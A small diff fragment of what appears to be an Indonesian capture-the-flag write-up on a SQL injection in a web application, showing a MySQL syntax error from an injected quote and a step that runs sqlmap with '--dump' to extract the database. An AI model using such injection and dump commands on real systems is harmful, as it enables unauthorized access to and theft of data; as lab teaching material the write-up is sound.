@@ -15,7 +15,7 @@ Cari vulnerability dalam web tersebut.
 UPDATE `secret` SET `judul` = 'a'', `secret` = 'a' WHERE `id` = '1431944397'You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'a' WHERE `id` = '1431944397'' at line 1
 ```
 3. Gunakan tools sqlmap untuk mempercepat proses dump database.<br/>
-command :<br/>
+command :<br/><br/>
 ``sqlmap -r exploit.txt --dump``<br/>
 dengan isi file exploit.txt sebagai berikut :<br/><br/>
 ```
